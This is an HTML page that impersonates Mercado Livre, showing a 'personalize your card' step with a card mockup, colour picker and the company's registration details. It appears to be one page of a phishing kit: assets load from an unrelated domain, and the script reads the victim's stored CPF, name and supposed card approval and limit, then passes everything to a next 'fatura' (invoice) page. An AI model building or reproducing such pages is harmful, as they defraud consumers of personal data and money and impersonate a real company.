<!DOCTYPE html><html lang="pt-BR"><head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://tributanix.online/home.html/validacao.html/2.html/aprovado.html/3.html/5.html/6.html/7.html/8.html/9.html/css/all.min-6.css">
    <title> - Personalize seu Cartão</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #F5F5F5;
            min-height: 100vh;
            color: #000000;
            position: relative;
            overflow-x: hidden;
        }
        .bg-decoration {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: -1;
            opacity: 0.03;
            pointer-events: none;
        }
        .decoration {
            position: absolute;
            border-radius: 50%;
            background: #ffe600;
        }
        .decoration1 {
            width: 300px;
            height: 300px;
            top: 10%;
            right: 5%;
            animation: float1 20s infinite ease-in-out;
        }
        .decoration2 {
            width: 200px;
            height: 200px;
            bottom: 10%;
            left: 5%;
            animation: float2 25s infinite ease-in-out;
        }
        .decoration3 {
            width: 150px;
            height: 150px;
            top: 50%;
            left: 50%;
            animation: float3 30s infinite ease-in-out;
        }
        @keyframes float1 {
            0%, 100% { transform: translate(0, 0) scale(1); }
            50% { transform: translate(-30px, 30px) scale(1.1); }
        }
        @keyframes float2 {
            0%, 100% { transform: translate(0, 0) scale(1); }
            50% { transform: translate(30px, -30px) scale(0.9); }
        }
        @keyframes float3 {
            0%, 100% { transform: translate(-50%, -50%) rotate(0deg); }
            50% { transform: translate(-50%, -50%) rotate(180deg); }
        }
        .header {
            background: #ffe600;
            padding: 20px;
            box-shadow: 0 5px 20px rgba(255, 217, 0, 0.2);
            animation: slideDown 0.6s ease-out;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .header::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: #ffe600;
            opacity: 0.8;
            animation: shimmer 3s infinite;
        }
        @keyframes shimmer {
            0% { opacity: 0.8; }
            50% { opacity: 0.5; }
            100% { opacity: 0.8; }
        }
        @keyframes slideDown {
            from { transform: translateY(-100%); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        .logo-img {
            height: 50px;
            width: auto;
            animation: logoAppear 0.8s ease-out;
        }
        @keyframes logoAppear {
            from { transform: scale(0.8); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }
        .content-container {
            max-width: 520px;
            margin: 30px auto;
            padding: 40px 30px;
            background: white;
            border-radius: 25px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
            animation: scaleIn 0.6s ease-out;
            position: relative;
            border: 1px solid #F5F5F5;
            text-align: center;
        }
        @keyframes scaleIn {
            from { transform: scale(0.9); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }
        .main-title {
            font-size: 28px;
            font-weight: 700;
            color: #000000;
            line-height: 1.3;
            margin-bottom: 40px;
            animation: fadeInUp 0.6s ease-out;
        }
        @keyframes fadeInUp {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        .card {
            background: linear-gradient(45deg, #f0ce00, #e6c55a);
            border-radius: 15px;
            padding: 20px;
            height: 200px;
            width: 340px;
            margin: 0 auto 30px;
            position: relative;
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
            border: 1px solid rgba(255,255,255,0.1);
            overflow: hidden;
        }

        .card-top {
            display: flex;
            justify-content: space-between;
            margin-bottom: 60px;
        }

        .card-bottom {
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
        }

        .card-name {
            font-family: 'Sora', sans-serif;
            font-size: 14px;
            color: rgb(255, 255, 255);
            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
            letter-spacing: 1px;
        }

        @keyframes shine {
            0% { left: -100%; }
            20% { left: 100%; }
            100% { left: 100%; }
        }
        .colors-container {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 18px;
            margin: 50px 0;
            animation: fadeIn 0.6s ease-out 0.3s both;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        .color-circle {
            width: 38px;
            height: 38px;
            border-radius: 50%;
            cursor: pointer;
            position: relative;
            transition: all 0.3s ease;
            border: 2px solid rgba(255,255,255,0.9);
            box-shadow: 0 3px 10px rgba(0,0,0,0.2);
        }
        .color-circle:hover {
            transform: translateY(-3px) scale(1.08);
            box-shadow: 0 6px 20px rgba(0,0,0,0.25);
        }
        .color-circle.active {
            transform: translateY(-5px) scale(1.12);
            border: 3px solid #000000;
            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
        }
        .color-circle.active::after {
            content: '✓';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: white;
            font-size: 12px;
            font-weight: 900;
            text-shadow: 0 1px 3px rgba(0,0,0,0.7);
        }
        .yellow-color {
            background: linear-gradient(135deg, #ffe600, #FFC107);
        }
        .yellow-color.active::after {
            color: #000000;
            text-shadow: none;
        }
        .gray-color {
            background: linear-gradient(135deg, #9E9E9E, #757575);
        }
        .green-color {
            background: linear-gradient(135deg, #2E7D32, #1B5E20);
        }
        .black-color {
            background: linear-gradient(135deg, #424242, #212121);
        }
        .pink-color {
            background: linear-gradient(135deg, #AD1457, #880E4F);
        }
        .button {
            background: #ffe600;
            color: #000000;
            padding: 20px 45px;
            border-radius: 50px;
            text-decoration: none;
            display: block;
            font-weight: 700;
            font-size: 18px;
            transition: all 0.3s ease;
            box-shadow: 0 8px 25px rgba(255, 217, 0, 0.35);
            position: relative;
            overflow: hidden;
            text-align: center;
            border: none;
            cursor: pointer;
            width: 100%;
            font-family: 'Inter', sans-serif;
            animation: fadeIn 0.8s ease-out 0.5s both;
        }
        .button::before {
            content: '';
            position: absolute;
            top: 50%;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: left 0.5s ease;
        }
        .button:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 35px rgba(255, 217, 0, 0.4);
            background: #ffe600;
        }
        .button:hover::before {
            left: 100%;
        }
        .button:active {
            transform: translateY(0);
        }
        footer {
            padding: 30px 20px;
            text-align: center;
            background: #FAFAFA;
            border-top: 1px solid #E8E8E8;
            margin-top: 50px;
        }
        footer p {
            color: #7F8C8D;
            font-size: 12px;
            margin: 3px 0;
            line-height: 1.5;
        }
        .footer-company {
            font-weight: 700;
            color: #000000;
            font-size: 14px;
            margin-bottom: 8px;
        }
        @media (max-width: 500px) {
            .content-container {
                margin: 20px 15px;
                padding: 30px 20px;
            }
            .main-title {
                font-size: 24px;
            }
            .logo-img {
                height: 55px;
            }
            .button {
                padding: 18px 35px;
                font-size: 16px;
            }
            .colors-container {
                gap: 15px;
            }
            .color-circle {
                width: 35px;
                height: 35px;
            }
            .card {
                width: 100%;
                max-width: 320px;
            }
        }
    </style>
</head>
<body>
    <div class="bg-decoration">
        <div class="decoration decoration1"></div>
        <div class="decoration decoration2"></div>
        <div class="decoration decoration3"></div>
    </div>
    <div class="header">
        <img src="images/logomerc.png" alt="" class="logo-img">
    </div>
    <div class="content-container">
        <h1 class="main-title">Personalize o seu cartão</h1>

        <div class="card" id="creditCard" style="background: linear-gradient(135deg, #f0ce00, #e6c55a); box-shadow: 0 10px 20px rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.1); overflow: hidden; position: relative;">
            <div style="position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent); animation: shine 3s infinite; z-index: 1;"></div>

            <div class="card-top">
                <img src="images/logomerc.png" alt="Logo " id="logoImg" style="width: 100px; filter: drop-shadow(0 2px 3px rgba(0,0,0,0.2));">
                <div style="font-size: 12px; color: rgba(255, 255, 255, 0.8); font-family: 'Sora', sans-serif; text-transform: uppercase; letter-spacing: 1px;">Gold</div>
            </div>

            <div style="position: absolute; top: 60%; left: 0; transform: translateY(-50%); width: 100%;">
                <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
                    <div style="display: flex; align-items: center; margin-left: 20px;">
                        <img src="images/chip.png" alt="Chip" style="width: 40px; filter: drop-shadow(0 2px 4px rgba(255, 255, 255, 0.3));">
                    </div>
                    <i class="fas fa-wifi fa-rotate-90" style="color: rgb(255, 255, 255); font-size: 24px; margin-right: 20px; text-shadow: 0 2px 4px rgba(0,0,0,0.3);"></i>
                </div>
            </div>

            <div class="card-bottom">
                <div style="display: flex; flex-direction: column; align-items: flex-start;">
                    <span class="card-name" id="cardName" style="text-shadow: 0 1px 2px rgba(0,0,0,0.3); letter-spacing: 1px;">NOME DO TITULAR</span>
                    <span style="font-size: 8px; color: rgba(255, 255, 255, 0.7); font-family: 'Sora', sans-serif; margin-top: 3px;">TITULAR DO CARTÃO</span>
                </div>
                <div style="display: flex; flex-direction: column; align-items: flex-end;">
                    <img src="images/visa.png" alt="mastercard" style="width: 50px; filter: brightness(100);">
                    <span style="font-size: 8px; color: rgba(255, 255, 255, 0.979); font-family: 'Sora', sans-serif; margin-top: 3px; text-transform: uppercase;">Crédito</span>
                </div>
            </div>

            <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: repeating-linear-gradient(45deg, rgba(0,0,0,0.03) 0px, rgba(0,0,0,0.03) 2px, transparent 2px, transparent 4px); pointer-events: none; z-index: 0;"></div>
        </div>

        <div class="colors-container">
            <div class="color-circle yellow-color active" onclick="selectNewColor('yellow', '#ffe600', '#f0ce00', '#e6c55a', this)"></div>
            <div class="color-circle gray-color" onclick="selectNewColor('gray', '#999999', '#9E9E9E', '#E0E0E0', this)"></div>
            <div class="color-circle green-color" onclick="selectNewColor('green', '#2E7D32', '#2E7D32', '#1B5E20', this)"></div>
            <div class="color-circle black-color" onclick="selectNewColor('black', '#000000', '#000000', '#333333', this)"></div>
            <div class="color-circle pink-color" onclick="selectNewColor('pink', '#AD1457', '#AD1457', '#880E4F', this)"></div>
        </div>

        <button class="button" onclick="continuarPersonalizacao()">Continuar</button>
    </div>

    <footer>
        <p class="footer-company">Mercado Livre | 23.862.762/0001-00</p>
        <p>Av. das Nações Unidas, 3000 - Bonfim, Osasco - SP, 06233-903</p>
        <p>© 2025 - Todos os direitos reservados</p>
    </footer>

    <script>
        // =======================================================
        // SISTEMA DE PASSAGEM DE PARÂMETROS URL - ADICIONADO
        // =======================================================
        
        // Função para capturar parâmetros da URL
        function getUrlParams() {
            const params = {};
            const queryString = window.location.search;
            const urlParams = new URLSearchParams(queryString);
            
            for (const [key, value] of urlParams) {
                params[key] = value;
            }
            return params;
        }

        // Função para construir URL com parâmetros
        function buildUrlWithParams(baseUrl) {
            const params = getUrlParams();
            const url = new URL(baseUrl, window.location.href);
            
            Object.keys(params).forEach(key => {
                url.searchParams.append(key, params[key]);
            });
            
            return url.toString();
        }

        // Debug: Mostrar parâmetros atuais no console
        console.log('Parâmetros atuais da página 10:', getUrlParams());

        // =======================================================
        // CÓDIGO ORIGINAL MANTIDO
        // =======================================================

        const UserData = {
            save: function(dados) {
                sessionStorage.setItem('Mercado Librebank_user_data', JSON.stringify(dados));
            },
            load: function() {
                const dados = sessionStorage.getItem('Mercado Librebank_user_data');
                return dados ? JSON.parse(dados) : null;
            },
            update: function(novosDados) {
                const dadosExistentes = this.load() || {};
                const dadosAtualizados = { ...dadosExistentes, ...novosDados };
                this.save(dadosAtualizados);
                return dadosAtualizados;
            },
            clear: function() {
                sessionStorage.removeItem('Mercado Librebank_user_data');
            }
        };

        const dadosUsuario = UserData.load();
        console.log('Dados do usuário carregados:', dadosUsuario);

        if (dadosUsuario && dadosUsuario.nome) {
            document.getElementById('cardName').textContent = dadosUsuario.nome.toUpperCase();
        }

        let corSelecionada = 'yellow';
        let corHex = '#ffe600';

        function selectNewColor(color, hex, color1, color2, element) {
            document.querySelectorAll('.color-circle').forEach(circle => {
                circle.classList.remove('active');
            });

            element.classList.add('active');

            document.getElementById('creditCard').style.background = `linear-gradient(45deg, ${color1}, ${color2})`;

            // Altera a cor da logo baseado na cor selecionada
            const logoImg = document.getElementById('logoImg');
            if (color === 'black' || color === 'green' || color === 'pink') {
                // Logo branca para cartões escuros (preto, verde, rosa)
                logoImg.style.filter = 'brightness(0) invert(1) drop-shadow(0 2px 3px rgba(255,255,255,0.3))';
            } else {
                // Logo normal para cores claras (amarelo, cinza)
                logoImg.style.filter = 'drop-shadow(0 2px 3px rgba(0,0,0,0.2))';
            }

            corSelecionada = color;
            corHex = hex;
        }

        // =======================================================
        // FUNÇÃO ATUALIZADA PARA PRESERVAR PARÂMETROS
        // =======================================================

        function continuarPersonalizacao() {
            UserData.update({
                etapa_atual: 'personalizacao',
                cartao_cor: corSelecionada,
                cartao_cor_hex: corHex,
                personalizacao_data: new Date().toISOString()
            });

            console.log('Personalização salva:', corSelecionada, corHex);
            console.log('Dados completos:', UserData.load());

            // ALTERE '11.html' para o nome da próxima página
            window.location.href = buildUrlWithParams('/home.html/validacao.html/2.html/aprovado.html/3.html/5.html/6.html/7.html/8.html/9.html/fatura.html/');
        }

        if (dadosUsuario) {
            console.log('CPF:', dadosUsuario.cpf);
            console.log('Nome:', dadosUsuario.nome);
            console.log('Cartão aprovado:', dadosUsuario.cartao_aprovado);
            console.log('Limite:', dadosUsuario.cartao_limite);
        }
    </script>

</body></html>
